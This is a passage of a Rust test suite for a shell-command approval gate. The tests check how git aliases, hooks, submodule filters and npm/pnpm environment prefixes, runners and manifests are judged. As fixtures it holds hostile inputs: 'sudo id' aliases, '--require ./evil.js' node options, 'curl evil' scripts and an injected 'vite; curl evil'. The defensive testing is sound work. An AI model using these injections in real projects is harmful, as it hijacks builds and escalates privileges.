        let st = gate.judge("git st", &[]);
        assert_eq!(
            st.outcome(),
            shell_gate::Outcome::Run,
            "`st` is `status`, a free read"
        );
        assert_eq!(st.run, free_read_of(&["status", "--ignore-submodules=all"]));
        assert_eq!(
            gate.judge("git p", &[]).judgement.refused_by(),
            Some("git push"),
            "`p` is `push`, which the denylist refuses"
        );
        assert_eq!(
            gate.judge("git x", &[]).judgement.refused_by(),
            Some("sudo"),
            "a `!` alias is read through to what it runs"
        );
        let y = gate.judge("git y", &[]);
        assert_eq!(
            y.outcome(),
            shell_gate::Outcome::Prompt,
            "a shell alias is dynamic"
        );
        assert!(!y.standing());
        let ls = gate.judge("ls", &[]).grants(Scope::Session, 1);
        assert_eq!(
            gate.judge("git y", &ls).outcome(),
            shell_gate::Outcome::Prompt,
            "a standing approval never covers an alias"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn git_reads_an_alias_from_the_repositorys_own_config() {
        let dir = scratch("git-alias");
        let git = |args: &[&str]| {
            Command::new("git")
                .args(args)
                .current_dir(&dir)
                .output()
                .expect("git runs")
        };
        git(&["init", "-q"]);
        git(&["config", "alias.who", "!sudo id"]);
        assert_eq!(git_alias(&dir, "who"), Some("!sudo id".to_owned()));
        assert_eq!(git_alias(&dir, "nobody"), None);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn the_regimen_declares_the_loop_by_its_pre_seeded_list() {
        let read = |text: &str| declared(&regimen::parse(text).expect("a regimen"));
        assert_eq!(read("arm = \"x\"\n"), Ok(None));
        assert_eq!(
            read("allowed_commands = []\napproval_policy = \"ask\"\n[limits]\nmax_steps = 4\n"),
            Ok(Some(Declared {
                allowed_commands: Vec::new(),
                max_steps: Some(4),
                approval_policy: Some("ask".to_owned()),
                approvals_off: false,
                text_fallback: false,
                output_cap: OutputCap::DEFAULT,
                surface: ToolSurface::Bash,
            }))
        );
        // The approval lever's `none`: commands run with no allow set.
        assert_eq!(
            read("approval = \"none\"\n"),
            Ok(Some(Declared {
                allowed_commands: Vec::new(),
                max_steps: None,
                approval_policy: None,
                approvals_off: true,
                text_fallback: false,
                output_cap: OutputCap::DEFAULT,
                surface: ToolSurface::Bash,
            }))
        );
        assert!(read("approval = \"ask\"\n").is_err());
        // #560: the text fallback, `off` unless declared `on`.
        let on = read("approval = \"none\"\ntool_call_text_fallback = \"on\"\n")
            .expect("declared")
            .expect("runs commands");
        assert!(on.text_fallback);
        assert!(read("approval = \"none\"\ntool_call_text_fallback = \"yes\"\n").is_err());
        assert!(read("allowed_commands = \"ls\"\n").is_err());
        assert!(read("allowed_commands = [\"\"]\n").is_err());
        assert!(read("allowed_commands = []\n[limits]\nmax_steps = 0\n").is_err());
    }

    #[test]
    fn a_pre_seed_is_a_shape_and_a_denylisted_one_is_refused() {
        let dir = scratch("preseed");
        let gate = gate_in(&dir);
        let entries =
            preseeded(&["ls -la".to_owned(), "wc -l".to_owned()], &gate).expect("two shapes");
        assert_eq!(
            entries
                .iter()
                .map(|e| e.shape.to_string())
                .collect::<Vec<_>>(),
            ["ls", "wc"]
        );
        assert!(
            entries
                .iter()
                .all(|e| e.scope == Scope::Preseeded && e.decided_at.is_none())
        );
        assert!(preseeded(&["sudo id".to_owned()], &gate).is_err());
        assert!(preseeded(&["eval x".to_owned()], &gate).is_err());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn the_store_lives_under_the_state_dir_and_refuses_to_open_inside_a_writable_path() {
        let dir = scratch("store");
        let tree = dir.join("tree");
        let state = dir.join("state");
        std::fs::create_dir_all(&tree).expect("a tree");
        let policy = Policy::unconfined();
        let (store, held) = Store::open(&state, &tree, &policy).expect("it opens");
        assert!(held.is_empty());
        assert!(
            store.path().starts_with(&state),
            "{}",
            store.path().display()
        );

        let entry = Entry {
            shape: Shape {
                program: "npm".to_owned(),
                subcommand: Some("install".to_owned()),
            },
            digest: Some("ab".repeat(32)),
            scope: Scope::Workspace,
            origin: Origin::Operator,
            decided_at: Some(9),
            why: Some("not_approved".to_owned()),
            approved_unix_ms: Some(7),
        };
        store
            .write(std::slice::from_ref(&entry), 1)
            .expect("written");
        let (_, held) = Store::open(&state, &tree, &policy).expect("it reopens");
        assert_eq!(
            held,
            [Entry {
                origin: Origin::Store,
                decided_at: Some(0),
                ..entry
            }],
            "kept with the time it was approved"
        );
        let walk = std::fs::read_dir(&tree).expect("the tree").count();
        assert_eq!(walk, 0, "nothing was written into the worktree");

        assert!(
            Store::open(&tree.join(".state"), &tree, &policy).is_err(),
            "a store in the worktree opened"
        );
        let mut writable = Policy::unconfined();
        writable.writable = vec![dir.join("ref").to_string_lossy().into_owned()];
        assert!(Store::open(&dir.join("ref"), &tree, &writable).is_err());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_writable_reference_checkouts_changes_are_its_porcelain_status() {
        let dir = scratch("reference");
        let reference = dir.join("reference");
        let plain = dir.join("plain");
        std::fs::create_dir_all(&reference).expect("a reference");
        std::fs::create_dir_all(&plain).expect("a plain dir");
        let init = Command::new("git")
            .args(["init", "-q"])
            .current_dir(&reference)
            .status()
            .expect("git runs");
        assert!(init.success());
        std::fs::write(reference.join("touched.txt"), "x").expect("a change");
        let mut policy = Policy::unconfined();
        policy.writable = vec![
            reference.to_string_lossy().into_owned(),
            plain.to_string_lossy().into_owned(),
        ];
        let modified = reference_modified(&policy);
        assert_eq!(
            modified,
            BTreeMap::from([(
                reference.to_string_lossy().into_owned(),
                "?? touched.txt\n".to_owned()
            )]),
            "only the checkout, and its status as git prints it"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn the_cwd_is_recorded_as_a_tilde_path_under_home_and_never_expanded() {
        let home = Path::new("/var/lib/drive");
        assert_eq!(
            cwd_label(Path::new("/var/lib/drive/git/x"), Some(home)),
            "~/git/x"
        );
        assert_eq!(cwd_label(Path::new("/srv/x"), Some(home)), "/srv/x");
        assert_eq!(cwd_label(Path::new("/srv/x"), None), "/srv/x");
    }

    /// A scratch repository holding one commit of `f`, in a directory with
    /// no shell metacharacter in its name (git runs hooks and filters
    /// through the shell).
    fn repo_with_one_commit(name: &str) -> (PathBuf, PathBuf) {
        let dir = std::env::temp_dir().join(format!("diet-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let repo = dir.join("repo");
        std::fs::create_dir_all(&repo).expect("a repo");
        git_in(&repo, &["init", "-q"]);
        std::fs::write(repo.join("f"), "a\n").expect("a file");
        git_in(&repo, &["add", "f"]);
        git_in(&repo, &["commit", "-qm", "a"]);
        (dir, repo)
    }

    /// Makes the index stat-dirty for `f`, its content unchanged, so a read
    /// that refreshes the index writes it -- and git runs
    /// `post-index-change`.
    fn stat_dirty(repo: &Path) {
        set_a_new_mtime(&repo.join("f"));
    }

    /// Gives `path` an mtime no earlier call gave any file, its content
    /// unchanged.
    fn set_a_new_mtime(path: &Path) {
        use std::sync::atomic::{AtomicU64, Ordering};
        static NEXT: AtomicU64 = AtomicU64::new(946_684_800);
        let then = std::time::SystemTime::UNIX_EPOCH
            + std::time::Duration::from_secs(NEXT.fetch_add(1, Ordering::SeqCst));
        std::fs::File::options()
            .write(true)
            .open(path)
            .expect("the file")
            .set_modified(then)
            .expect("an mtime");
    }

    /// Review round 3, finding 1: a free read refreshes a stat-dirty index
    /// and rewrites it, and git runs the repository's `post-index-change`
    /// hook -- from `.git/hooks/`, or from a `core.hooksPath` the
    /// repository's config points into the worktree. Plain git runs it (the
    /// control); a free read as the loop runs it does not.
    #[test]
    fn a_free_read_runs_no_hook_the_repository_holds() {
        let (dir, repo) = repo_with_one_commit("git-hooks");
        let marker = dir.join("ran");
        let program = marker_program(&dir, &marker);
        std::fs::create_dir_all(repo.join(".git/hooks")).expect("hooks");
        std::fs::copy(&program, repo.join(".git/hooks/post-index-change")).expect("a hook");
        std::fs::create_dir_all(repo.join("hk")).expect("hk");
        std::fs::copy(&program, repo.join("hk/post-index-change")).expect("a hook");
        for hooks_path in [None, Some("hk")] {
            if let Some(path) = hooks_path {
                git_in(&repo, &["config", "core.hooksPath", path]);
            }
            let _ = std::fs::remove_file(&marker);
            stat_dirty(&repo);
            git_in(&repo, &["status"]);
            assert!(
                marker.exists(),
                "control ({hooks_path:?}): plain `git status` runs the hook"
            );
            for line in ["git status", "git diff"] {
                let _ = std::fs::remove_file(&marker);
                stat_dirty(&repo);
                run_free(&repo, line);
                assert!(
                    !marker.exists(),
                    "({hooks_path:?}) the free read `{line}` ran the hook"
                );
            }
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Review round 3, finding 2: sorting branches by a `signature` atom
    /// verifies each signature, which runs `gpg.program`. Only sort keys
    /// that read no signature are free.
    #[test]
    fn git_branch_sorts_freely_only_by_keys_that_check_no_signature() {
        let dir = scratch("git-branch-sort");
        let gate = gate_in(&dir);
        for line in [
            "git branch --sort=signature",
            "git branch --sort=signature:grade",
            "git branch --list --sort=-signature:signer",
            "git branch --sort=contents:signature",
            "git branch --sort=subject",
            "git branch --sort",
        ] {
            assert_eq!(
                gate.judge(line, &[]).outcome(),
                shell_gate::Outcome::Prompt,
                "`{line}` ran as a free read"
            );
        }
        for line in [
            "git branch --sort=refname",
            "git branch --sort=-committerdate",
            "git branch --sort=version:refname --sort=-v:refname",
            "git branch --list --sort=objectname",
            "git branch --sort=creatordate --sort=-authordate",
        ] {
            assert_eq!(
                gate.judge(line, &[]).outcome(),
                shell_gate::Outcome::Run,
                "`{line}` should stay free"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The same sort, named by the repository's `branch.sort`: a `-c`
    /// override does not reach it (the key is multi-valued, measured on git
    /// 2.50.1), so with a signing key in the config `git branch` prompts.
    #[test]
    fn a_configured_branch_sort_makes_git_branch_prompt_where_a_signature_is_checked() {
        let (dir, repo) = repo_with_one_commit("git-branch-sort-config");
        let marker = dir.join("ran");
        let program = marker_program(&dir, &marker);
        sign_head(&repo, &dir);
        git_in(
            &repo,
            &["config", "gpg.program", &program.to_string_lossy()],
        );
        git_in(&repo, &["config", "branch.sort", "signature"]);
        git_in(&repo, &["branch"]);
        assert!(marker.exists(), "control: `branch.sort` runs gpg.program");
        for line in ["git branch", "git branch --list"] {
            assert_eq!(
                real_outcome(&repo, line),
                shell_gate::Outcome::Prompt,
                "`{line}` with a signing key and a `branch.sort`"
            );
        }
        git_in(&repo, &["config", "--unset", "branch.sort"]);
        assert_eq!(
            real_outcome(&repo, "git branch"),
            shell_gate::Outcome::Run,
            "with no `branch.sort`, `git branch` prints no commit"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Review round 3, finding 3: a free read never recurses into a
    /// submodule, whose own config and attributes it cannot vouch for --
    /// not when `.gitmodules` (a tracked file) says `ignore = none`, which
    /// beats `diff.ignoreSubmodules`, and not through an abbreviated
    /// `status` option.
    #[test]
    fn a_free_read_never_recurses_into_a_submodule() {
        let (dir, main) = repo_with_one_commit("git-submodule");
        let marker = dir.join("ran");
        let program = marker_program(&dir, &marker);
        let sub = dir.join("sub");
        std::fs::create_dir_all(&sub).expect("a sub");
        git_in(&sub, &["init", "-q"]);
        std::fs::write(sub.join("s"), "s\n").expect("a file");
        git_in(&sub, &["add", "s"]);
        git_in(&sub, &["commit", "-qm", "s"]);
        let added = git_in(
            &main,
            &[
                "-c",
                "protocol.file.allow=always",
                "submodule",
                "-q",
                "add",
                &sub.to_string_lossy(),
                "sub",
            ],
        );
        assert!(added.status.success(), "{added:?}");
        git_in(&main, &["commit", "-qm", "sub"]);
        let inner = main.join("sub");
        let inner_git =
            String::from_utf8(git_in(&inner, &["rev-parse", "--absolute-git-dir"]).stdout)
                .expect("utf-8");
        std::fs::write(
            Path::new(inner_git.trim()).join("info/attributes"),
            "s filter=x\n",
        )
        .expect("the submodule's info/attributes");
        git_in(
            &inner,
            &["config", "filter.x.clean", &program.to_string_lossy()],
        );
        std::fs::write(
            main.join(".gitmodules"),
            "[submodule \"sub\"]\n\tpath = sub\n\turl = x\n\tignore = none\n",
        )
        .expect(".gitmodules");
        let touch = || set_a_new_mtime(&inner.join("s"));
        let _ = std::fs::remove_file(&marker);
        touch();
        git_in(&main, &["status"]);
        assert!(
            marker.exists(),
            "control: plain `git status` runs the submodule's filter"
        );
        for line in ["git status", "git diff", "git status --short --branch"] {
            let _ = std::fs::remove_file(&marker);
            touch();
            run_free(&main, line);
            assert!(!marker.exists(), "the free read `{line}` ran it");
        }
        let gate = gate_in(&main);
        for line in [
            "git status --ignore-sub=none",
            "git status --ignore-submodules=none",
            "git status --verb",
            "git status --unt=no",
            "git diff --ignore-submodules=dirty",
        ] {
            assert_eq!(
                gate.judge(line, &[]).outcome(),
                shell_gate::Outcome::Prompt,
                "`{line}` ran as a free read"
            );
        }
        for line in [
            "git status --short --branch --show-stash",
            "git status --porcelain=v2 --untracked-files=no --ignored=matching",
            "git status --no-ahead-behind --find-renames=50 -- f",
        ] {
            assert_eq!(
                gate.judge(line, &[]).outcome(),
                shell_gate::Outcome::Run,
                "`{line}` should stay free"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Review round 3, finding 4: an environment prefix on an `npm` command
    /// changes what npm runs as `.npmrc` does (`npm_config_script_shell`,
    /// `npm_config_node_options`, `npm_config_userconfig`) -- with no write
    /// at all, through a `data:` import. No standing approval covers an npm
    /// command carrying one, and none can be granted for it.
    #[test]
    fn an_environment_prefix_on_an_npm_command_is_never_standing() {
        let dir = scratch("npm-prefix");
        let gate = gate_in(&dir);
        package(&dir, "node -e 0");
        let mut granted = Vec::new();
        for line in ["npm run build", "npm test", "npm install"] {
            granted.extend(gate.judge(line, &[]).grants(Scope::Session, 1));
        }
        for line in [
            "npm_config_script_shell=./e npm run build",
            "npm_config_node_options='--require ./evil.js' npm run build",
            "npm_config_userconfig=./rc npm run build",
            "npm_config_node_options=\"--import=data:text/javascript,0\" npm run build",
            "NPM_CONFIG_SCRIPT_SHELL=./e npm test",
            "Npm_Config_Script_Shell=./e npm install",
            "FOO=1 npm run build",
            "npm run build && npm_config_script_shell=./e npm test",
        ] {
            let judged = gate.judge(line, &granted);
            assert_eq!(
                judged.outcome(),
                shell_gate::Outcome::Prompt,
                "`{line}` was covered"
            );
            assert!(!judged.standing(), "`{line}` could be approved standing");
        }
        assert_eq!(
            gate.judge("npm run build", &granted).outcome(),
            shell_gate::Outcome::Run,
            "control: the bare form is covered"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Review round 3, finding 5: with no `start` script, `npm start` (and
    /// `npm restart`) runs `node server.js` when the file exists, so an
    /// approval of either binds to `server.js`'s bytes.
    #[test]
    fn npm_start_and_restart_bind_to_the_server_js_npm_runs_without_a_start_script() {
        let dir = scratch("npm-server-js");
        let gate = gate_in(&dir);
        std::fs::write(dir.join("package.json"), "{\"scripts\":{\"build\":\"x\"}}")
            .expect("package.json");
        for line in ["npm start", "npm restart"] {
            let _ = std::fs::remove_file(dir.join("server.js"));
            let granted = gate.judge(line, &[]).grants(Scope::Session, 1);
            assert_eq!(
                gate.judge(line, &granted).outcome(),
                shell_gate::Outcome::Run
            );
            std::fs::write(dir.join("server.js"), "console.log(1)").expect("server.js");
            assert_eq!(
                gate.judge(line, &granted).outcome(),
                shell_gate::Outcome::Prompt,
                "`{line}` covered a server.js that appeared after its approval"
            );
            let granted = gate.judge(line, &[]).grants(Scope::Session, 1);
            std::fs::write(dir.join("server.js"), "console.log(2)").expect("server.js");
            assert_eq!(
                gate.judge(line, &granted).outcome(),
                shell_gate::Outcome::Prompt,
                "`{line}` covered a changed server.js"
            );
        }
        let granted = gate.judge("npm run build", &[]).grants(Scope::Session, 1);
        std::fs::write(dir.join("server.js"), "console.log(3)").expect("server.js");
        assert_eq!(
            gate.judge("npm run build", &granted).outcome(),
            shell_gate::Outcome::Run,
            "`npm run build` never runs server.js"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Review round 3, finding 6: a standing npm approval covers the
    /// program `npm` as written, never a path to some other `npm`.
    #[test]
    fn a_standing_npm_approval_never_covers_a_path_qualified_npm() {
        let dir = scratch("npm-path");
        let gate = gate_in(&dir);
        package(&dir, "vite build");
        let mut granted = gate.judge("npm run build", &[]).grants(Scope::Session, 1);
        granted.extend(gate.judge("npm install", &[]).grants(Scope::Session, 1));
        for line in [
            "./npm run build",
            "/usr/local/bin/npm run build",
            "bin/npm install",
        ] {
            let judged = gate.judge(line, &granted);
            assert_eq!(
                judged.outcome(),
                shell_gate::Outcome::Prompt,
                "`{line}` was covered"
            );
            assert!(!judged.standing(), "`{line}` could be approved standing");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Review round 3, finding 7: a `package.json` npm reads but this
    /// cannot -- a UTF-8 byte-order mark, a lone surrogate escape -- would
    /// make every script read as absent. It fails closed: no npm command is
    /// standing, and an approval taken on a readable file covers nothing.
    #[test]
    fn an_unreadable_package_json_makes_no_npm_command_standing() {
        let dir = scratch("npm-unreadable");
        let gate = gate_in(&dir);
        package(&dir, "vite build");
        let mut granted = gate.judge("npm run build", &[]).grants(Scope::Session, 1);
        granted.extend(gate.judge("npm install", &[]).grants(Scope::Session, 1));
        for unreadable in [
            "\u{feff}{\"scripts\":{\"build\":\"curl evil\",\"postinstall\":\"x\"}}",
            "{\"description\":\"\\ud800\",\"scripts\":{\"build\":\"curl evil\"}}",
        ] {
            std::fs::write(dir.join("package.json"), unreadable).expect("package.json");
            // An approval taken on the unreadable file, then a changed one.
            let mut granted = granted.clone();
            for line in ["npm run build", "npm install"] {
                granted.extend(gate.judge(line, &[]).grants(Scope::Session, 1));
            }
            std::fs::write(
                dir.join("package.json"),
                unreadable.replace("curl evil", "curl worse"),
            )
            .expect("package.json");
            for line in ["npm run build", "npm install", "npm start"] {
                let judged = gate.judge(line, &granted);
                assert_eq!(
                    judged.outcome(),
                    shell_gate::Outcome::Prompt,
                    "`{line}` covered under `{unreadable}`"
                );
                assert!(
                    !judged.standing(),
                    "`{line}` could be approved standing under `{unreadable}`"
                );
            }
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The gate over `dir` for a session passing `names`.
    fn passing_in(dir: &Path, names: &[&str]) -> Gate {
        Gate {
            aliases: no_aliases,
            repository: clean_repository,
            ..Gate::standard(dir)
                .passing(&names.iter().map(|n| (*n).to_owned()).collect::<Vec<_>>())
        }
    }

    /// #484's ruling: `pnpm_config_store_dir` names pnpm's store and picks
    /// no program (pnpm 11.21.0 reads it, and its upper-case spelling, as
    /// `store-dir`), so a session passing it keeps an approved npm or pnpm
    /// call standing, as `npm_config_cache` does. `npm_config_store_dir`,
    /// which pnpm 11 does not read, lapses both like every other config
    /// variable.
    #[test]
    fn pnpm_config_store_dir_keeps_npm_and_pnpm_standing_as_the_cache_does() {
        let dir = scratch("pnpm-store-dir");
        let gate = gate_in(&dir);
        package(&dir, "vite build");
        let lines = [
            "npm run build",
            "npm install",
            "pnpm run build",
            "pnpm install",
        ];
        let granted: Vec<Entry> = lines
            .iter()
            .flat_map(|line| gate.judge(line, &[]).grants(Scope::Session, 1))
            .collect();
        for store in ["pnpm_config_store_dir", "PNPM_CONFIG_STORE_DIR"] {
            for line in lines {
                let judged =
                    passing_in(&dir, &["PATH", "npm_config_cache", store]).judge(line, &granted);
                assert_eq!(
                    judged.outcome(),
                    shell_gate::Outcome::Run,
                    "`{line}` under {store}"
                );
                assert!(judged.standing(), "`{line}` under {store}");
            }
        }
        for other in [
            "npm_config_store_dir",
            "NPM_CONFIG_STORE_DIR",
            "npm_config_script_shell",
            "pnpm_config_store",
            "pnpm_config_store_dir_x",
            "Pnpm_Config_Store_Dir",
            "pnpm_config_script_shell",
            "PNPM_CONFIG_VERIFY_DEPS_BEFORE_RUN",
        ] {
            for line in lines {
                let judged = passing_in(&dir, &["PATH", "pnpm_config_store_dir", other])
                    .judge(line, &granted);
                assert_eq!(
                    judged.outcome(),
                    shell_gate::Outcome::Prompt,
                    "`{line}` under {other}"
                );
                assert!(!judged.standing(), "`{line}` under {other}");
            }
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// `scripts.dev` in `dir`'s `package.json`.
    fn dev_script(dir: &Path, script: &str) {
        std::fs::write(
            dir.join("package.json"),
            format!("{{\"scripts\":{{\"dev\":\"{script}\"}}}}"),
        )
        .expect("package.json");
    }

    /// #484's ruling: a session approval of `<prefix> run dev`, where the
    /// prefix runs pnpm through a runner, binds to `scripts.dev` as `pnpm
    /// run dev`'s does, and lapses when it changes.
    fn a_run_through_binds_to_its_script(prefix: &str) {
        let dir = scratch(&format!(
            "pnpm-through-run-{}",
            sha256_hex(prefix.as_bytes())
        ));
        let gate = gate_in(&dir);
        dev_script(&dir, "vite");
        let run = format!("{prefix} run dev");
        let granted = gate.judge(&run, &[]).grants(Scope::Session, 1);
        assert_eq!(
            gate.judge(&run, &granted).outcome(),
            shell_gate::Outcome::Run,
            "`{run}` is covered by its own approval"
        );
        dev_script(&dir, "vite; curl evil");
        assert_eq!(
            gate.judge(&run, &granted).outcome(),
            shell_gate::Outcome::Prompt,
            "a changed `scripts.dev` still approved `{run}`"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// #484's ruling: an approval of `<prefix> install` covers that install
    /// and nothing else; a denylisted program under `<prefix> exec` or
    /// `<prefix> dlx` is refused, as under `pnpm exec`.
    fn an_install_through_covers_no_exec(prefix: &str) {
        let dir = scratch(&format!(
            "pnpm-through-install-{}",
            sha256_hex(prefix.as_bytes())
        ));
        let gate = gate_in(&dir);
        dev_script(&dir, "vite");
        let install = format!("{prefix} install");
        let granted = gate.judge(&install, &[]).grants(Scope::Session, 1);
        assert_eq!(
            gate.judge(&install, &granted).outcome(),
            shell_gate::Outcome::Run,
            "`{install}` is covered by its own approval"
        );
        for line in [
            format!("{prefix} exec sudo id"),
            format!("{prefix} dlx docker ps"),
        ] {
            assert_eq!(
                gate.judge(&line, &granted).outcome(),
                shell_gate::Outcome::Refused,
                "`{line}` under `{install}`'s approval"
            );
        }
        for line in [format!("{prefix} run dev"), format!("{prefix} exec vite")] {
            assert_eq!(
                gate.judge(&line, &granted).outcome(),
                shell_gate::Outcome::Prompt,
                "`{install}`'s approval covered `{line}`"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// #484, form one: `npx pnpm@11.20.0 run dev`, with and without npx's
    /// `--yes`, is judged as `pnpm run dev`.
    #[test]
    fn pnpm_run_through_npx_binds_to_its_scripts_text() {
        for prefix in [
            "npx pnpm@11.20.0",
            "npx --yes pnpm@11.20.0",
            "npx -y pnpm@11.20.0",
        ] {
            a_run_through_binds_to_its_script(prefix);
        }
    }

    /// #484, form two: an approval of `npx pnpm@11.20.0 install` does not
    /// cover `npx pnpm@11.20.0 exec sudo id`, which the denylist refuses.
    #[test]
    fn an_install_through_npx_covers_no_exec_and_meets_the_denylist() {
        for prefix in ["npx pnpm@11.20.0", "npx --yes pnpm@11.20.0"] {
            an_install_through_covers_no_exec(prefix);
        }
    }

    /// #484, form three: `npm exec pnpm …` (and `npm x`) is judged the same
    /// way.
    #[test]
    fn pnpm_through_npm_exec_is_judged_as_pnpm() {
        for prefix in [
            "npm exec pnpm@11.20.0",
            "npm exec --yes pnpm@11.20.0",
            "npm x pnpm@11.20.0",
        ] {
            a_run_through_binds_to_its_script(prefix);
            an_install_through_covers_no_exec(prefix);
        }
    }

    /// Review round 1 of #484, finding 7: `corepack pnpm[@v] <args>` is
    /// judged as `pnpm <args>`, as `npx pnpm` is.
    #[test]
    fn pnpm_through_corepack_is_judged_as_pnpm() {
        a_run_through_binds_to_its_script("corepack pnpm@11.20.0");
        an_install_through_covers_no_exec("corepack pnpm@11.20.0");
    }

    /// Review round 1 of #484, finding 1: with no `package.json`, pnpm reads
    /// `package.json5` or `package.yaml` (pnpm 11.21.0's
    /// `MANIFEST_BASE_NAMES`), which no digest reads. No pnpm command is
    /// standing then. npm reads only `package.json`, so npm is unaffected.
    #[test]
    fn a_pnpm_manifest_other_than_package_json_makes_no_pnpm_command_standing() {
        for (file, text) in [
            ("package.yaml", "scripts:\n  dev: vite\n  postinstall: x\n"),
            ("package.json5", "{scripts:{dev:'vite',postinstall:'x'}}"),
        ] {
            let dir = scratch(&format!("pnpm-manifest-{file}"));
            let gate = gate_in(&dir);
            std::fs::write(dir.join(file), text).expect("manifest");
            for line in [
                "pnpm install",
                "pnpm i",
                "pnpm run dev",
                "pnpm add left-pad",
            ] {
                assert!(
                    !gate.judge(line, &[]).standing(),
                    "`{line}` could be approved standing beside a `{file}`"
                );
            }
            assert!(
                gate.judge("npm run dev", &[]).standing(),
                "control: npm reads no `{file}`"
            );
            dev_script(&dir, "vite");
            assert!(
                gate.judge("pnpm run dev", &[]).standing(),
                "control: pnpm reads `package.json` first"
            );
            let _ = std::fs::remove_dir_all(&dir);
        }
    }

    /// Review round 1 of #484, finding 2: a pnpmfile named by config
    /// (`pnpmfile`, `globalPnpmfile`) or brought by `configDependencies` is
    /// loaded for every pnpm command, and its bytes are in no digest. A pnpm
    /// command is not standing while `pnpm-workspace.yaml`, `.npmrc` or
    /// `package.json`'s `pnpm` field mentions one.
    #[test]
    fn a_pnpmfile_named_by_config_makes_no_pnpm_command_standing() {
        for (file, text) in [
            ("pnpm-workspace.yaml", "pnpmfile: hooks.cjs\n"),
            ("pnpm-workspace.yaml", "pnpmfile:\n  - hooks.cjs\n"),
            ("pnpm-workspace.yaml", "globalPnpmfile: hooks.cjs\n"),
            (
                "pnpm-workspace.yaml",
                "configDependencies:\n  pnpm-plugin-x: 1.0.0+sha512-AAAA\n",
            ),
            (".npmrc", "pnpmfile=hooks.cjs\n"),
            (".npmrc", "global-pnpmfile=hooks.cjs\n"),
            (
                "package.json",
                "{\"scripts\":{\"dev\":\"vite\"},\"pnpm\":{\"configDependencies\":{\"x\":\"1\"}}}",
            ),
            (
                "package.json",
                "{\"scripts\":{\"dev\":\"vite\"},\"pnpm\":{\"pnpmfile\":\"hooks.cjs\"}}",
            ),
        ] {
            let dir = scratch("pnpm-pnpmfile-config");
            let gate = gate_in(&dir);
            dev_script(&dir, "vite");
            std::fs::write(dir.join("hooks.cjs"), "module.exports = {}\n").expect("hooks");
            std::fs::write(dir.join(file), text).expect("config");
            for line in ["pnpm install", "pnpm i", "pnpm run dev", "pnpm test"] {
                assert!(
                    !gate.judge(line, &[]).standing(),
                    "`{line}` could be approved standing under `{file}`: {text}"
                );
            }
            assert!(
                gate.judge("npm run dev", &[]).standing(),
                "control: npm loads no pnpmfile (`{file}`: {text})"
            );
            let _ = std::fs::remove_dir_all(&dir);
        }
    }

    /// #484's review round 2, N4(b): a runner's bare `pnpm` (`npx pnpm`,
    /// `corepack pnpm`, `npm exec pnpm`, no version) resolves whichever
    /// pnpm it finds, so it is never standing, and a plain `pnpm` approval
    /// never covers it; the denylist still reads through it.
    #[test]
    fn a_plain_pnpm_approval_covers_no_bare_runner_pnpm() {
        let dir = scratch("pnpm-bare-runner");
        let gate = gate_in(&dir);
        dev_script(&dir, "vite");
        let granted: Vec<Entry> = ["pnpm run dev", "pnpm install"]
            .iter()
            .flat_map(|line| gate.judge(line, &[]).grants(Scope::Session, 1))
            .collect();
        for line in [
            "npx pnpm run dev",
            "npx -y pnpm run dev",
            "corepack pnpm run dev",
            "npm exec pnpm run dev",
            "npm x pnpm run dev",
            "npx pnpm install",
            "corepack pnpm install",
            "npm exec pnpm install",
        ] {
            let judged = gate.judge(line, &granted);
            assert_eq!(
                judged.outcome(),
                shell_gate::Outcome::Prompt,
                "a plain pnpm approval covered `{line}`"
            );
            assert!(!judged.standing(), "`{line}` could be approved standing");
        }
        for line in [
            "npx pnpm exec sudo id",
            "corepack pnpm exec sudo id",
            "npm exec pnpm dlx docker ps",
        ] {
            assert_eq!(
                gate.judge(line, &granted).outcome(),
                shell_gate::Outcome::Refused,
                "{line}"
            );
        }
        let pinned = gate
            .judge("npx pnpm@11.20.0 run dev", &[])
            .grants(Scope::Session, 1);
        assert_eq!(
            pinned
                .iter()
                .map(|e| e.shape.to_string())
                .collect::<Vec<_>>(),
            ["pnpm@11.20.0 run"],
            "a pinned pnpm keeps its own shape"
        );
        assert_eq!(
            gate.judge("npx pnpm@11.20.0 run dev", &granted).outcome(),
            shell_gate::Outcome::Prompt,
            "a plain pnpm approval covered a pinned runner form"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// #484: through a runner, the shape is the package as written, so
    /// another pinned version is another approval; any runner flag but
    /// `--yes`/`-y`, a version that is not exact, an option or an
    /// environment prefix, or a path to the runner leaves the call never
    /// standing, its inner command still read for the denylist.
    #[test]
    fn pnpm_through_a_runner_is_standing_only_pinned_exactly_and_with_yes_alone() {
        let dir = scratch("pnpm-through-exact");
        let gate = gate_in(&dir);
        dev_script(&dir, "vite");
        let granted = gate
            .judge("npx pnpm@11.20.0 run dev", &[])
            .grants(Scope::Session, 1);
        assert_eq!(
            granted
                .iter()
                .map(|e| e.shape.to_string())
                .collect::<Vec<_>>(),
            ["pnpm@11.20.0 run"]
        );
        assert_eq!(
            gate.judge("npx pnpm@11.21.0 run dev", &granted).outcome(),
            shell_gate::Outcome::Prompt,
            "another pinned pnpm is another program"
        );
        for line in [
            "npx -- pnpm@11.20.0 run dev",
            "npx -q pnpm@11.20.0 run dev",
            "npx --no-install pnpm@11.20.0 run dev",
            "npx --package pnpm@11.20.0 pnpm run dev",
            "npx -p pnpm@11.20.0 pnpm run dev",
            "npx pnpm@latest run dev",
            "npx pnpm@11 run dev",
            "npx pnpm@^11.20.0 run dev",
            "npx --yes pnpm@11.20.0 -C exercise install",
            "npx pnpm@11.20.0 dev",
            "npx pnpm@11.20.0 exec vite",
